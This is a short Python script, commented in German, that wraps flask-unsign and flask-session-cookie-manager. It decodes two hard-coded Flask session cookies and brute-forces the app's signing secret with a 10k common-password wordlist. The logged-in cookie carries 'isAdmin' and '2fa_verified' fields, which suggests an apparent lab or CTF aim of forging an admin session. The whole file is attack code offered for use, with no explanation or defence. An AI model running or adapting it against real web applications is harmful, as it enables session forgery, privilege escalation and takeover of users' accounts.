import subprocess
import flask
# uneingeloggt
default_cookie = '.eJyrVjJKS9QtSy3KTMtMTVGyKikqTdUBicWji2UWO6bkZuYpWSm5JeYUpyrpKJXklxTEF6cmF6WWAEVDzIOiQp1dw5yMo3zCzHydnSPdHUONgwMDXDyDAoI8I4EaSotTi_ISc1OBqktSi0tAXKVaACkuKyQ.aFD9QQ.nnkUoBQhMPfomWkuC8brWOJMDqE'
# eingeloggt
session_cookie = 'eyIyZmFfdmVyaWZpZWQiOnRydWUsImlzQWRtaW4iOiJGYWxzZSIsInVzZXJuYW1lIjoidGVzdHVzZXIifQ.aFEJiA.7SD1cd2T6SN6JYXdPxLdxHzUvsk'

wordlist = "10k-most-common.txt"

# 1. Option: Vernwendung von flask-session-cookie-manager
#flask-session-cookie-manager brute --cookie session_cookie --wordlist 10k-most-common.txt

def run_flask_session_cookie_manager(session_cookie, wordlist):
    print("Versuche Bruteforce mit flask-session-cookie-manager...")
    try:
        subprocess.run([
            "python",
            "-m", "flask_session_cookie_manager",
            "brute",
            "--cookie", session_cookie,
            "--wordlist", wordlist
        ])
    except FileNotFoundError:
        print("flask-session-cookie-manager nicht installiert (pip install flask-session-cookie-manager)")


# 2. Option: Verwendung von flask-unsign
# 2.1Cookie analysieren (lesen)
#flask-unsign --decode --cookie session_cookie
def run_flask_unsign_decode(session_cookie, wordlist):
    print("Versuche Session-Cokie zu dekodieren zur Analyse...")
    try:
        subprocess.run([
            "flask-unsign",
            "--decode",
            "--cookie", session_cookie,
            "--wordlist", wordlist
        ])
    except FileNotFoundError:
        print("flask-unsign nicht installiert (pip install flask-unsign)")

# 2.2Bruteforce-Angriff mit Wordlist
#flask-unsign --unsign --cookie session_cookie --wordlist 10k-most-common.txt
def run_flask_unsign_unsign(session_cookie, wordlist):
    print("Versuche Bruteforce mit flask-unsign...")
    try:
        subprocess.run([
            "flask-unsign",
            "--unsign",
            "--cookie", session_cookie,
            "--wordlist", wordlist,
            "--no-literal-eval" # wichtig, damit reine zahlen in wordlist als String erfasst werden von flask-unsign
        ])
    except FileNotFoundError:
        print("flask-unsign nicht installiert (pip install flask-unsign)")

def main():
    #run_flask_session_cookie_manager(session_cookie, wordlist)
    run_flask_unsign_decode(default_cookie, wordlist)
    run_flask_unsign_decode(session_cookie, wordlist)
    run_flask_unsign_unsign(session_cookie, wordlist)
    

if __name__ == "__main__":
    main()
